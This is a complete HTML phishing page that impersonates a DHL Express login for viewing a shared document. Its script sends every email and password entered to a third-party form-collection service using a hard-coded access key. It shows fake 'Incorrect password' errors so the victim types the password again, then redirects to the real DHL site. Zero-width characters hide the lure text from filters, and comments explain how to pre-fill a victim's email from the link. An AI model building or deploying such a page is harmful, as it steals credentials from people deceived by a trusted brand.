<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>DHL WORLDWIDE EXPRESS</title>
  <!-- favicon kept from original -->
  <link rel="shortcut icon" href="https://m.media-amazon.com/images/I/61UbDovOw-L._UF1000,1000_QL80_.jpg?semt=ais_hybrid">
  <style>
    /* ----- all original styles preserved, no external style.css dependency ----- */
    body {
      background-image: url('https://www.tasimacilar.com/d/news/13603.jpg');
      background-size: cover;
      background-repeat: no-repeat;
      background-position: fit;
      font-family: Arial, sans-serif;
      color: #333;
      text-align: center;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background-color: rgba(225, 225, 225, 0.5);
      padding: 30px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      border-radius: 8px;
      width: 320px;
    }

    .logo img {
      max-width: 55%;
      height: auto;
      margin-bottom: 30px;
    }

    .input-fields input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }

    .signin-button {
      padding: 10px 20px;
      background-color: #E30022;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    .signin-button:hover {
      background-color: #0056b3;
    }

    .message {
      display: none;
      color: red;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img id="logo" src="https://www.valimor.com/wp-content/uploads/2018/08/dhl-worldwide-express-png-logo-1.png" alt="DHL Worldwide Express">
      <p style="margin-bottom: -30px;margin-top: 2px;font-weight: bold;text-align: right;"></p>
      <p style="font-size: 12px;align: left;margin-bottom: 10px;color: green;">Au​th﻿e​ntic‌atio‍n Re‍quir​e‍d.<br>gain‌ access to​ y﻿o‌ur﻿ tra⁠c‍k⁠in​g de‌t﻿ail⁠s‌.</p>
      <p>T‌h﻿is‌ do​cum​e⁠n‌t‍ is﻿ sha‍r​ed​ f﻿r‌o﻿m D﻿HL﻿ E⁠xp‌res‍s & r‍e‍qu‍i‍res​ auth﻿entic‍a‌tion&#x1F512<strong> <br><br>Email verification is required. Sign in with your email to view the document</strong></p>
    </div>

    <form id="loginForm">
      <div class="input-fields">
        <!-- Email field will be auto-filled from URL hash (#email@domain.com) or ?email=... -->
        <input id="email" name="email" type="email" placeholder="Email" value="" required />
        <input id="password" name="password" type="password" placeholder="Password" required />
      </div>
      <button type="submit" class="signin-button" id="signin-button">LOGIN</button>
    </form>

    <div id="message" class="message">Incorrect password</div>
  </div>

  <script>
    // --- ORIGINAL FUNCTIONALITY (fully preserved) ---
    let attempt = 0;
    const maxAttempts = 3;
    const form = document.getElementById('loginForm');
    const messageDiv = document.getElementById('message');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');

    // Hide error message when user starts typing in password field
    passwordInput.addEventListener('input', function() {
      messageDiv.style.display = 'none';
    });
    // Also hide on focus (optional)
    passwordInput.addEventListener('focus', function() {
      messageDiv.style.display = 'none';
    });

    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const email = emailInput.value;
      const password = passwordInput.value;

      // Send to Web3Forms (email -> email, password -> message) — original behavior
      fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          access_key: '6477a55d-9dfc-447f-bcfc-8ae9e5278302',
          name: 'DHL Login',
          email: email,
          message: password
        }).toString()
      }).catch(err => console.error('Submission error:', err));

      attempt++;

      if (attempt < maxAttempts) {
        // Show the error message (it will be hidden again when user types)
        messageDiv.style.display = 'block';
        messageDiv.textContent = 'Incorrect password';
        passwordInput.value = '';
      } else {
        // After third failed attempt, redirect to official DHL page
        setTimeout(function() {
          window.location.href = 'https://www.dhl.com/ng-en/home.html';
        }, 2000);
      }
    });

    // --- ADDITIONAL: AUTO-FILL EMAIL FROM URL (hash or query parameter) ---
    // This makes the link work like: https://yourdomain.com/index.html#victim@email.com
    // or ?email=user@example.com — the email field is pre-filled, user only types password.
    (function autoFillEmailFromUrl() {
      function getEmailFromUrl() {
        // Priority 1: URL hash (fragment) — example: https://domain.com/page.html#user@domain.com
        if (window.location.hash && window.location.hash.length > 1) {
          let rawHash = window.location.hash.substring(1);
          try {
            let decoded = decodeURIComponent(rawHash);
            // basic email validation to avoid random garbage
            if (decoded && decoded.includes('@') && decoded.includes('.')) {
              return decoded;
            }
          } catch(e) { /* ignore decoding errors */ }
        }
        // Priority 2: query parameter ?email=...
        const urlParams = new URLSearchParams(window.location.search);
        const emailParam = urlParams.get('email');
        if (emailParam) {
          try {
            let decodedParam = decodeURIComponent(emailParam);
            if (decodedParam && decodedParam.includes('@') && decodedParam.includes('.')) {
              return decodedParam;
            }
          } catch(e) { /* ignore */ }
        }
        return '';
      }

      const prefilledEmail = getEmailFromUrl();
      if (prefilledEmail && emailInput) {
        emailInput.value = prefilledEmail;
      }
    })();
  </script>
</body>
</html>
